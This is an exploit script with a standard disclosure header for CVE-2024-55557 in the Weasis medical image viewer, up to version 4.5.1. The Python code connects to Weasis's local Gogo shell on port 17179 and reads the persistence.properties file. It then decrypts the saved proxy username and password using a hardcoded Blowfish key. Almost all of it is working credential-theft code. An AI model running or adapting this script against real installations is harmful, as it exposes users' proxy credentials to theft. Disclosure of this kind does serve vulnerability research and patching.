# Exploit Title: Weasis 4.5.1 - Proxy Credentials retrieval and offline decryption
# Discovered By: Riccardo Degli Esposti (partywave)
# Exploit Author: Riccardo Degli Esposti (partywave)
# Vendor Homepage: https://weasis.org/en/
# Software Link: https://github.com/nroduit/Weasis
# Version: before and including 4.5.1 
# Tested on: Linux
# CVE-ID: CVE-2024-55557

import argparse
import base64
import gzip
from Crypto.Cipher import Blowfish
from Crypto.Util.Padding import unpad
from pwn import *

context.log_level = 'critical'

def decrypt_blowfish(data, key):
    key = key.encode('utf-8')
    cipher = Blowfish.new(key, Blowfish.MODE_ECB)
    decrypted_data = cipher.decrypt(data)
    decrypted_data = unpad(decrypted_data, 8)
    
    return decrypted_data.decode('utf-8')

def decompress_and_decrypt_base64(encoded_str, key):
    compressed_data = base64.b64decode(encoded_str)
    
    with gzip.GzipFile(fileobj=BytesIO(compressed_data)) as gzip_file:
        decompressed_data = gzip_file.read()
    
    decrypted_text = decrypt_blowfish(decompressed_data, key)

    return decrypted_text

def parse_file(file_content):
    u_id, p_id = 'proxy.auth.user=', 'proxy.auth.pwd='
    key = "proxy.auth"

    lines = file_content.split('\n')

    if 'proxy.auth=true' in lines:
        username, password = '', ''
        for l in lines:
            if p_id in l:
                password = l.split(p_id)[1]
            elif u_id in l:
                username = l.split(u_id)[1]
                return username + ':' + decompress_and_decrypt_base64(password, key)
    else:
        print('[?] No password proxy to grab')
        return -2    

def get_local_file(absolute_filepath):
    filepath = absolute_filepath.lstrip().strip()
    if filepath.split('.')[-1] != 'properties':
        print('[!] Error')
        return -1
    else:
        with open(absolute_filepath, 'r') as f:
            file_content = f.read()
        return parse_file(file_content)


def get_remote_file(IP, PORT, remote_parse_file):
    cmd_1  = b'weasis:info -a'
    r = remote(IP, PORT)
    r.recvuntil(b'g!')
    r.sendline(cmd_1)
    out_1 = r.recvuntil(b'g!').decode().split('\n')
    install_path = out_1[1].split(':')[1].lstrip().strip() + '/data/weasis-core/persistence.properties'
    if not remote_parse_file:
        return install_path
    else:
        cmd_2 = b'gogo:cat ' + install_path.encode()
        r.sendline(cmd_2)
        out_2 = r.recvuntil(b'g!').decode()
        return parse_file(out_2)

def main():
    parser = argparse.ArgumentParser(description="Script to handle password file retrieval locally or remotely.")
    parser.add_argument('--local', action='store_true', help="Use local file retrieval if specified.")

    args = parser.parse_args()

    try:
        if args.local:
            file = get_remote_file('127.0.0.1', '17179', False)
            result = get_local_file(file)
        else:
            result = get_remote_file('127.0.0.1', '17179', True)

        print(result)

    except Exception as e:
        print("An error occurred:", e)

if __name__ == "__main__":
    main()